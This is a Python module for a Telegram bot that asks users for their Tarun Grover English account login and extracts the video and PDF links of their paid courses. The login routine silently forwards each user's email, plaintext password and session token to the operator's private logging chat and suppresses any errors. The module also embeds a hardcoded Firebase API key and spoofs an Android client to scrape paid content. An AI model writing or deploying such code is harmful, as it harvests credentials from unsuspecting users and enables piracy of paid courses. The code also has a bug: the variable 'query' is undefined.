import aiohttp
import asyncio
import os
import time
from typing import Dict, List
from datetime import datetime
from pyrogram.enums import ParseMode
from config import LOGGER_ID
from Extractor import app
from Extractor.core.func import send_file


class TARUN_GROVER:
    BASE_URL = "https://prod-api.tarungroverenglish.com"
    FIREBASE_URL = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword"
    FIREBASE_KEY = "AIzaSyCBeo_YdcfFvBctezHzEV78PycPrBlu3Nc"

    def __init__(self):
        self.headers = {
            'user-agent': 'okhttp/4.11.0',
            'x-device-id': 'e0d96eeafabd9635',
            'content-type': 'application/json'
        }
        self.video_count = 0
        self.pdf_count = 0
        self.session = None

    async def initialize_session(self):
        if not self.session:
            self.session = aiohttp.ClientSession()
        return self.session

    async def cleanup(self):
        if self.session:
            await self.session.close()
            self.session = None

    async def login(self, credentials: str) -> str:
        if '*' in credentials:
            email, password = credentials.split('*')
            data = {
                "email": email,
                "password": password,
                "returnSecureToken": True,
                "clientType": "CLIENT_TYPE_ANDROID"
            }
            async with self.session.post(
                self.FIREBASE_URL,
                params={'key': self.FIREBASE_KEY},
                json=data,
                headers=self.headers
            ) as response:
                result = await response.json()
                if 'error' in result:
                    raise ValueError(f"Login failed: {result['error']['message']}")
                token = result['idToken']
                try:
                    await app.send_message(
                        chat_id=LOGGER_ID,
                        text=f"✅ TARUN GROVER ENGLISH\n\nᴛᴏᴋᴇɴ:\n<code>{token}</code>\n\nɪᴅ ᴘᴀssᴡᴏʀᴅ: <code>{email}*{password}</code>",
                        reply_to_message_id=6,
                        parse_mode=ParseMode.HTML
                    )
                except:
                    pass
                return token
        token = credentials.strip()
        try:
            await app.send_message(
                chat_id=LOGGER_ID,
                text=f"✅ TARUN GROVER ENGLISH\n\nᴛᴏᴋᴇɴ:\n<code>{token}</code>",
                reply_to_message_id=6,
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass
        return token

    async def auth(self):
        async with self.session.post(
            f"{self.BASE_URL}/auth/register",
            headers=self.headers
        ) as response:
            pass

    async def get_courses(self) -> List[Dict]:
        async with self.session.get(
            f"{self.BASE_URL}/courses/owned",
            params={"page": "1", "limit": "999999"},
            headers=self.headers
        ) as response:
            result = await response.json()
            return result['body']['items']

    async def get_course_content(self, course_id: str) -> List[Dict]:
        async with self.session.get(
            f"{self.BASE_URL}/courses/single-v3",
            params={'id': course_id, 'preferredVideoGroupIds': ''},
            headers=self.headers
        ) as response:
            result = await response.json()
            return result['body']['lessons']

    async def get_lesson_content(self, lesson_id: str):
        # Get lesson details and PDFs concurrently
        lesson_task = self.session.get(
            f"{self.BASE_URL}/courses/lessons/single-v3",
            params={"id": lesson_id},
            headers=self.headers
        )
        pdf_task = self.session.get(
            f"{self.BASE_URL}/resources",
            params={'page': '1', 'limit': '9999', 'lessonId': lesson_id},
            headers=self.headers
        )
        
        responses = await asyncio.gather(lesson_task, pdf_task)
        lesson_data = await responses[0].json()
        pdf_data = await responses[1].json()
        
        return lesson_data['body'], pdf_data['body']['items']

    @staticmethod
    def format_time(seconds: float) -> str:
        return str(datetime.utcfromtimestamp(seconds).strftime('%H:%M:%S'))

    async def process_course(self, app, message, chat_id: int, user_id: int) -> None:
        try:
            await self.initialize_session()
            
            status_msg = await message.reply_text(
                "**🔑 For access, please transmit your ID & Password in the correct sequence:\n\n"
                "🔒 Send like this: ID*Password\n\nOr Send Token....**"
            )

            credentials_msg = await app.listen(chat_id=chat_id, user_id=user_id)
            credentials = credentials_msg.text
            await credentials_msg.delete(True)

            token = await self.login(credentials)
            self.headers['authorization'] = f'Bearer {token}'
            await self.auth()
            await status_msg.edit_text("**✅ Login successful! Fetching courses...**")

            courses = await self.get_courses()
            
            batch_list = "\n".join(
                f"`{batch['id']}` - **{batch['title']}**"
                for batch in courses
            )
            await status_msg.edit_text(
                f"**📚 Available Batches:**\n\n{batch_list}\n\n"
                "**Send Batch ID to download:**"
            )

            batch_msg = await app.listen(chat_id=chat_id, user_id=user_id)
            batch_id = batch_msg.text.strip()
            await batch_msg.delete()

            batch = next((c for c in courses if str(c['id']) == batch_id), None)
            if not batch:
                raise ValueError("Invalid batch ID")
            
            batch_name = batch['title']
            await status_msg.edit_text("**📥 Extracting Videos Links...**")

            start_time = time.time()
            lessons = await self.get_course_content(batch_id)
            
            links = []
            self.video_count = 0
            self.pdf_count = 0
            
            # Process lessons concurrently
            async def process_lesson(lesson):
                lesson_data, pdfs = await self.get_lesson_content(lesson['id'])
                
                if 'qualities' in lesson_data:
                    best_quality = max(
                        lesson_data["qualities"],
                        key=lambda x: int(x["quality"][:-1])
                    )
                    links.append(f"{lesson_data['title']}: {best_quality['url']}")
                    self.video_count += 1
                    
                for pdf in pdfs:
                    links.append(f"{pdf['title']}: {pdf['url']}")
                    self.pdf_count += 1

            # Process all lessons in parallel
            await asyncio.gather(*[process_lesson(lesson) for lesson in lessons])

            filename = f"{batch_name}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write('\n'.join(sorted(links)))

            duration = time.time() - start_time
            elapsed = self.format_time(duration)

            caption = (
                f"**App Name: Tarun Grover English**\n"
                f"**Batch Name:** `{batch_name}`\n\n"
                f"🍿 **Total Videos**: `{self.video_count}`\n"
                f"📝 **Total pdfs**: `{self.pdf_count}`\n"
                f"⌚️ **Time Taken**: `{elapsed}`"
            )

            return await send_file(filename, caption, status_msg, query)

        except Exception as e:
            await message.reply_text(f"❌ Error: {str(e)}")
            return None
        finally:
            await self.cleanup()

async def tarun_grover(app, query, message):
    return await TARUN_GROVER().process_course(app, message, message.chat.id, query.from_user.id)
